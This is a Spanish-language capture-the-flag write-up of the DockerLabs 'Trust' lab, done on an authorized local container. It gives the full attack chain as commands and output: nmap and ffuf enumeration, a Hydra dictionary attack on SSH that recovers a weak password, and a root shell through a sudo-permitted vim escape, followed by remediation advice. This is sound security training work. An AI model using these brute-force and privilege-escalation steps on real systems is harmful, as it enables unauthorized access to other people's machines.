# Trust: Writeup de DockerLabs

**Fecha de resolución:** 18 de octubre de 2026  
**Plataforma:** [DockerLabs](https://dockerlabs.es/)  
**Dificultad:** Muy fácil  
**Objetivo:** Practicar enumeración web, fuerza bruta SSH con Hydra y escalada de privilegios abusando de sudoers.  
**Estado:** completado

> **Spoilers:** este documento explica la resolución completa de Trust. Todas las pruebas se realizaron sobre un laboratorio local autorizado.

## 1. Entorno y punto de partida

Utilicé Kali Linux 2026.2 dentro de VirtualBox (8 GB de RAM y 4 vCPU). La máquina **Trust** se desplegó como contenedor Docker mediante el script `auto_deploy.sh` de DockerLabs. El despliegue devolvió la IP **`172.17.0.2`**, accesible desde Kali.

Es una dirección interna del laboratorio, no una IP pública. Al tratarse de Docker, no fue necesario crear otra máquina virtual para Trust.

## 2. Reconocimiento de puertos y servicios

Empecé enumerando todos los puertos TCP, identificando servicios y ejecutando los scripts predeterminados de Nmap:

```bash
sudo nmap -sS -sC -sV -p- 172.17.0.2
```

Resultados relevantes:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
80/tcp open  http    PHP cli server 5.5 or later
http-title: Apache2 Debian Default Page: It works
```

El escaneo encontró **dos puertos abiertos** (`22` y `80`). SSH ofrecía un posible punto de entrada si aparecían credenciales; el puerto 80 permitía comenzar con enumeración web.

## 3. Enumeración de rutas con ffuf

Comencé utilizando el diccionario `common.txt`:

```bash
ffuf -u http://172.17.0.2/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt -c -t 20
```

**Problema:** las 4.614 rutas probadas devolvían aparentemente `200 OK`, todas con el mismo tamaño de **10.701 bytes**. Estas respuestas idénticas no eran hallazgos útiles: el servidor devolvía el mismo contenido aunque cambiara la ruta.

Para eliminar esas respuestas repetitivas utilicé el filtro por tamaño (`-fs`):

```bash
ffuf -u http://172.17.0.2/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -fs 10701 -c -t 20
```

Este segundo intento no produjo hallazgos. Cambié entonces el enfoque: también buscaría archivos con extensiones comunes, en lugar de nombres de ruta sin extensión.

```bash
ffuf -u http://172.17.0.2/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -e .php,.html,.txt -fs 10701 -c -t 20
```

Ahora sí apareció una respuesta diferente:

```text
secret.php  [Status: 200, Size: 927, Words: 328, Lines: 40]
```

**Hallazgo:** `/secret.php` era un recurso accesible y su tamaño difería claramente del de las respuestas anteriores.

## 4. Análisis de `secret.php`

Abrí la ruta descubierta en Firefox y revisé su respuesta completa:

```bash
curl -i http://172.17.0.2/secret.php
```

El HTML mostraba:

```text
Hola Mario,
Esta web no se puede hackear.
```

También observé la cabecera:

```http
X-Powered-By: PHP/8.2.31
```

No había formularios ni parámetros visibles, pero **Mario** podía ser una pista sobre un nombre de usuario del sistema. Era una hipótesis, no una confirmación. Como Nmap había detectado SSH, decidí comprobar esa línea de investigación.

## 5. Auditoría de credenciales SSH

Probé la conexión:

```bash
ssh mario@172.17.0.2
```

SSH solicitó una contraseña. Esto **no confirma por sí solo** que el usuario exista, porque el servicio puede responder de forma similar ante cuentas inválidas.

Al tratarse de un contenedor vulnerable de práctica, realicé una prueba de diccionario controlada con Hydra y la lista RockYou:

```bash
hydra -l mario \
  -P /usr/share/wordlists/rockyou.txt \
  -t 4 -f ssh://172.17.0.2
```

Hydra identificó un par de credenciales válido:

```text
host: 172.17.0.2
login: mario
password: chocolate
```

**Resultado:** una contraseña incluida en un diccionario conocido permitió autenticar al usuario vía SSH. En un sistema real, esto justificaría reforzar la política de contraseñas y los controles de acceso remoto.

## 6. Acceso inicial y enumeración local

Me conecté con las credenciales encontradas:

```bash
ssh mario@172.17.0.2
```

Y verifiqué la identidad de la sesión:

```bash
whoami
id
hostname
```

Resultado:

```text
mario
uid=1000(mario) gid=1000(mario) groups=1000(mario)
15b8d97b3040
```

El acceso inicial era como usuario sin privilegios administrativos. El hostname se correspondía con el entorno contenedorizado de Trust.

## 7. Escalada de privilegios con Vim

Para revisar permisos delegados a `mario`, ejecuté:

```bash
sudo -l
```

El resultado mostraba esta regla:

```text
User mario may run the following commands:
    (ALL) /usr/bin/vim
```

El permiso es peligroso porque **Vim permite ejecutar comandos externos**. Por tanto, si se ejecuta con `sudo`, esos comandos pueden heredar privilegios elevados. La técnica está documentada en [GTFOBins para Vim](https://gtfobins.github.io/gtfobins/vim/).

Ejecuté:

```bash
sudo /usr/bin/vim -c ':!/bin/sh'
```

Y comprobé la identidad de la nueva shell:

```bash
whoami
id
```

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

**Resultado final: `root` dentro del contenedor Trust.** No se explotó una vulnerabilidad de Vim: se aprovechó una **configuración insegura de `sudo`** que permitía utilizarlo como root.

## 8. Hallazgos y medidas correctivas

**Contraseña débil en SSH**

Hydra encontró las credenciales `mario:chocolate` utilizando RockYou. En un entorno real se deberían exigir contraseñas robustas, limitar los intentos de autenticación y valorar el acceso por claves SSH.

**Permisos `sudo` inseguros**

`mario` podía ejecutar `/usr/bin/vim` con privilegios de root. La medida correctiva es aplicar el principio de mínimo privilegio y no delegar como root herramientas que permiten ejecutar comandos del sistema.

**Exposición de información interna**

`/secret.php` mostraba el nombre Mario. Por sí solo no permitía obtener acceso, pero proporcionó una pista que facilitó la siguiente fase. Conviene evitar la publicación de información interna innecesaria.

**Respuestas HTTP indistinguibles para rutas inexistentes**

Numerosas rutas diferentes devolvían el mismo contenido y código `200`. Una configuración que responda con `404` cuando corresponda permite identificar mejor los recursos inexistentes y facilita el análisis y la supervisión.

## 9. Conclusión

Trust se resolvió mediante una cadena sencilla pero instructiva:

1. **Nmap** identificó HTTP y SSH.
2. **ffuf** encontró `/secret.php` después de filtrar las respuestas repetidas y probar extensiones.
3. El contenido web sugirió el usuario `mario`.
4. **Hydra** confirmó credenciales débiles válidas para SSH.
5. **`sudo -l`** reveló un permiso peligroso sobre Vim.
6. **Vim** permitió abrir una shell como `root`.

La lección práctica más útil fue comprobar cada hipótesis con evidencias: un `200 OK` no garantiza que una ruta exista, pedir una contraseña no demuestra que el usuario sea válido y disponer de `sudo` sobre un editor puede equivaler a delegar una shell privilegiada.

### Cierre del laboratorio

Al finalizar, salí de la shell de root, de Vim y de la conexión SSH. El contenedor se puede detener mediante el mecanismo previsto por `auto_deploy.sh` (en general, `Ctrl+C` en la terminal del despliegue).

---

*Writeup de elaboración propia a partir de una práctica realizada en un entorno controlado de DockerLabs. No se utilizaron sistemas de terceros.*
